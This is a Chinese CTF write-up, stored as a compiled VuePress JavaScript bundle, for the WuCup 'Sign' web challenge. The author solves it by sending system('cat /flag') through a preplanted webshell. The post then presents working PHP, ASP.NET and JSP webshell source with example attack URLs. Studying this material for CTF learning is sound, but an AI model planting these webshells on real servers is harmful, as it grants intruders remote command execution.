(window.webpackJsonp=window.webpackJsonp||[]).push([[142],{667:function(s,e,t){"use strict";t.r(e);var a=t(2),n=Object(a.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("Boxx"),s._v(" "),e("p",[s._v("参加了第一届吾杯网络安全技能大赛，这是一道Web方向的签到题，这是我的第24题")]),s._v(" "),e("p"),e("div",{staticClass:"table-of-contents"},[e("ul",[e("li",[e("a",{attrs:{href:"#题目描述-post浅浅签个到吧"}},[s._v("题目描述：POST浅浅签个到吧")])]),e("li",[e("a",{attrs:{href:"#考点-webshell的应用"}},[s._v("考点：WebShell的应用")])]),e("li",[e("a",{attrs:{href:"#预期解-通过webshell的方式去执行命令"}},[s._v("预期解：通过WebShell的方式去执行命令")])])])]),e("p"),s._v(" "),e("ul",[e("li",[s._v("网址【"),e("a",{attrs:{href:"https://www.wucup.net/",target:"_blank",rel:"noopener noreferrer"}},[s._v("传送门"),e("OutboundLink")],1),s._v("】")])]),s._v(" "),e("table",[e("thead",[e("tr",[e("th",[s._v("题目编号")]),s._v(" "),e("th",[s._v("题目名称")]),s._v(" "),e("th",[s._v("题目方向")]),s._v(" "),e("th",[s._v("难度")])])]),s._v(" "),e("tbody",[e("tr",[e("td",[s._v("无")]),s._v(" "),e("td",[s._v("Sign")]),s._v(" "),e("td",[s._v("Web")]),s._v(" "),e("td",[s._v("1")])])])]),s._v(" "),e("h1",{attrs:{id:"题目24-sign"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#题目24-sign"}},[s._v("#")]),s._v(" 题目24：Sign")]),s._v(" "),e("h3",{attrs:{id:"题目描述-post浅浅签个到吧"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#题目描述-post浅浅签个到吧"}},[s._v("#")]),s._v(" 题目描述：POST浅浅签个到吧")]),s._v(" "),e("h3",{attrs:{id:"考点-webshell的应用"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#考点-webshell的应用"}},[s._v("#")]),s._v(" 考点：WebShell的应用")]),s._v(" "),e("h3",{attrs:{id:"预期解-通过webshell的方式去执行命令"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#预期解-通过webshell的方式去执行命令"}},[s._v("#")]),s._v(" 预期解：通过WebShell的方式去执行命令")]),s._v(" "),e("p",[s._v("首先进入靶机，页面提示passwd:sgin")]),s._v(" "),e("p",[s._v("原本一开始想的是通过HackBar给目标传一个passwd的参数，参数的值是sgin，结果发现不可以，还是返回了passwd:sgin。尝试了多种方式，比如把sgin改成了sign等，种种方法都不行。")]),s._v(" "),e("p",[s._v("比赛结束后，参考了跑"),e("a",{attrs:{href:"https://blog.csdn.net/CHTXRT/article/details/144175464",target:"_blank",rel:"noopener noreferrer"}},[e("strong",[s._v("CHTXRT")]),e("OutboundLink")],1),s._v("师傅的WriteUp，才发现是直接用WebShell的方式发一个POST请求，参数名是sgin，参数值直接就是system(ls /)等命令，这位师傅的WriteUp对我的启发很大，之前虽然学了WebShell的用法，但没有想到这道题是用WebShell来完成的。")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("sgin")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("system"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"ls /"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:"/img/essay/image-20241202194034912.png",alt:"image-20241202194034912"}})]),s._v(" "),e("p",[s._v("同理，我们看到目录下有个flag文件，直接cat该文件即可")]),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("sgin")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("system"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cat /flag"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("看了老师傅的WP，感受颇多，最近虽然刷了一些入门题单，但感觉都没形成条件反射，缺少很多基础知识，对于提示不敏感，以及对入门题单讲过的知识点和方法不熟悉，所以导致这道Web签到题都没有做出来")]),s._v(" "),e("blockquote",[e("h1",{attrs:{id:"webshell-简介"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#webshell-简介"}},[s._v("#")]),s._v(" WebShell 简介")]),s._v(" "),e("h2",{attrs:{id:"一、定义"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#一、定义"}},[s._v("#")]),s._v(" 一、定义")]),s._v(" "),e("p",[s._v("WebShell 是一种特殊的脚本文件，它允许攻击者通过网页浏览器与目标服务器进行交互，进而在服务器端执行各种命令，实现对服务器的一定程度的控制。")]),s._v(" "),e("h2",{attrs:{id:"二、常见类型及操作示例"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#二、常见类型及操作示例"}},[s._v("#")]),s._v(" 二、常见类型及操作示例")]),s._v(" "),e("h3",{attrs:{id:"php-webshell"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#php-webshell"}},[s._v("#")]),s._v(" PHP WebShell")]),s._v(" "),e("p",[s._v("在基于 PHP 的网站环境中较为常见。以下是一个简单的 PHP WebShell 示例代码：")]),s._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token php language-php"}},[e("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("isset")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'cmd'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n   "),e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'cmd'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'的执行结果：<br>'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'<pre>'")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("shell_exec")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'</pre>'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br")])]),e("p",[s._v("在这个示例中：")]),s._v(" "),e("ul",[e("li",[s._v("首先通过 "),e("code",[s._v("isset($_GET['cmd'])")]),s._v(" 检查是否通过 GET 请求传递了名为 "),e("code",[s._v("cmd")]),s._v(" 的参数。")]),s._v(" "),e("li",[s._v("如果存在该参数，就将其值赋给变量 "),e("code",[s._v("$cmd")]),s._v("。")]),s._v(" "),e("li",[s._v("然后使用 "),e("code",[s._v("system($cmd)")]),s._v(" 或 "),e("code",[s._v("shell_exec($cmd)")]),s._v(" 函数来执行这个命令。"),e("code",[s._v("system")]),s._v(" 函数会直接执行命令并输出结果到浏览器（但可能不会完整返回所有输出内容），而 "),e("code",[s._v("shell_exec")]),s._v(" 函数执行命令后会返回完整的输出结果，这里通过 "),e("code",[s._v("<pre>")]),s._v(" 标签对输出进行格式化展示，以便更清晰地查看。")])]),s._v(" "),e("p",[s._v("攻击者可以通过构造类似 "),e("code",[s._v("http://target.com/shell.php?cmd=ls -l")]),s._v(" 的 URL 来执行服务器上的 "),e("code",[s._v("ls -l")]),s._v(" 命令，查看指定目录下文件的详细信息等操作。")]),s._v(" "),e("h3",{attrs:{id:"asp-asp-net-webshell"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#asp-asp-net-webshell"}},[s._v("#")]),s._v(" ASP/"),e("a",{attrs:{href:"https://asp.net/",target:"_blank",rel:"noopener noreferrer"}},[s._v("ASP.NET"),e("OutboundLink")],1),s._v(" WebShell")]),s._v(" "),e("p",[s._v("适用于基于微软的 IIS 服务器和 ASP/"),e("a",{attrs:{href:"https://asp.net/",target:"_blank",rel:"noopener noreferrer"}},[s._v("ASP.NET"),e("OutboundLink")],1),s._v("技术的网站。示例代码如下（简化示例）：")]),s._v(" "),e("div",{staticClass:"language-asp line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<%\nif(Request.QueryString["cmd"]!= null)\n{\n   string cmd = Request.QueryString["cmd"];\n   ProcessStartInfo psi = new ProcessStartInfo(cmd);\n   psi.UseShellExecute = false;\n   psi.RedirectStandardOutput = true;\n   Process p = Process.Start(psi);\n   Response.Write(p.StandardOutput.ReadToEnd());\n}\n%>\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br")])]),e("p",[s._v("在这个"),e("a",{attrs:{href:"https://asp.net/",target:"_blank",rel:"noopener noreferrer"}},[s._v("ASP.NET"),e("OutboundLink")],1),s._v("的示例中：")]),s._v(" "),e("ul",[e("li",[s._v("首先判断是否通过 QueryString（类似 GET 请求方式）接收到名为 "),e("code",[s._v("cmd")]),s._v(" 的参数。")]),s._v(" "),e("li",[s._v("若接收到，将其赋值给变量 "),e("code",[s._v("cmd")]),s._v("。")]),s._v(" "),e("li",[s._v("然后创建一个 "),e("code",[s._v("ProcessStartInfo")]),s._v(" 对象来设置要执行的命令相关信息，通过 "),e("code",[s._v("Process.Start")]),s._v(" 启动该命令的执行，并将执行结果通过 "),e("code",[s._v("Response.Write")]),s._v(" 输出到浏览器，供攻击者查看。")])]),s._v(" "),e("p",[s._v("攻击者可通过构造如 "),e("code",[s._v("http://targetserver.com/shell.asp?cmd=dir")]),s._v(" 的 URL 来执行服务器上的 "),e("code",[s._v("dir")]),s._v(" 命令，获取当前目录下的文件列表信息。")]),s._v(" "),e("h3",{attrs:{id:"jsp-webshell"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#jsp-webshell"}},[s._v("#")]),s._v(" JSP WebShell")]),s._v(" "),e("p",[s._v("在 Java Web 应用环境下使用。示例代码如下：")]),s._v(" "),e("div",{staticClass:"language-jsp line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('<%@ page import="java.io.BufferedReader,java.io.InputStreamReader,java.io.IOException,java.lang.ProcessBuilder" %>\n<%\nif(request.getParameter("cmd")!= null)\n{\n   String cmd = request.getParameter("cmd");\n   ProcessBuilder pb = new ProcessBuilder(cmd.split(" "));\n   pb.redirectErrorStream(true);\n   Process p = pb.start();\n   BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n   String line;\n   while ((line = br.readLine())!= null)\n   {\n       out.println(line);\n   }\n   br.close();\n}\n%>\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br")])]),e("p",[s._v("在这个 JSP WebShell 示例中：")]),s._v(" "),e("ul",[e("li",[s._v("同样先检查是否通过 "),e("code",[s._v('request.getParameter("cmd")')]),s._v(" 接收到名为 "),e("code",[s._v("cmd")]),s._v(" 的参数。")]),s._v(" "),e("li",[s._v("若有，将其赋值给变量 "),e("code",[s._v("cmd")]),s._v("。")]),s._v(" "),e("li",[s._v("接着使用 "),e("code",[s._v("ProcessBuilder")]),s._v(" 来构建要执行的命令，并启动执行过程。通过 "),e("code",[s._v("BufferedReader")]),s._v(" 读取命令执行的输出结果，并逐行输出到浏览器页面上，供攻击者查看执行情况。")])]),s._v(" "),e("p",[s._v("攻击者可通过构造如 "),e("code",[s._v("http://targetserver.com/shell.jsp?cmd=ls -al")]),s._v(" 的 URL 来执行服务器上的 "),e("code",[s._v("ls -al")]),s._v(" 命令，查看目录下文件的详细信息。")]),s._v(" "),e("h2",{attrs:{id:"三、使用场景及目的"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#三、使用场景及目的"}},[s._v("#")]),s._v(" 三、使用场景及目的")]),s._v(" "),e("p",[s._v("WebShell 通常被攻击者用于在成功入侵目标服务器后，进一步深入控制服务器。例如，通过执行文件操作命令来查看、修改或删除服务器上的文件；执行系统命令获取服务器的系统信息、网络配置等；或者利用服务器的资源进行其他恶意活动，如发动 DDoS 攻击等。在 CTF 比赛中，了解 WebShell 有助于理解某些涉及服务器攻击与防御相关的题目，帮助选手更好地分析题目思路和找到解题方法。")])])],1)}),[],!1,null,null,null);e.default=n.exports}}]);